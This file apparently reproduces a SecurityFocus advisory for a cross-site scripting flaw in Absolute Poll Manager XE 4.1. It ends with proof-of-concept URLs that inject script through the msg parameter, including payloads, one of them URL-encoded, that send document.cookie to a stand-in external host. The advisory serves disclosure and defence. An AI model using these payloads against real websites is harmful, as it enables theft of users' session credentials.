@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/25492/info
+
+Absolute Poll Manager XE is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+Exploiting this vulnerability may allow an attacker to perform cross-site scripting attacks on unsuspecting users in the context of the affected website. As a result, the attacker may be able to steal cookie-based authentication credentials and to launch other attacks.
+
+This issue affects Absolute Poll Manager XE 4.1; other versions may also be vulnerable. 
+
+http://www.example.com/AbsolutePollManager/xlaapmview.asp?p=1&msg=<script>alert("running+code+within+the+context+of+"%2bdocument.domain)</script> http://www.example.com/AbsolutePollManager/xlaapmview.asp?p=1&msg=<script>location="http://www.example2.com/?"%2bdocument.cookie</script> http://www.example.com/AbsolutePollManager/xlaapmview.asp?p=1&msg=%3cscript%3elocation=%22http%3a//www.%65xample%2ecom/?%22%2bdocument.cookie%3c/script%3e& 
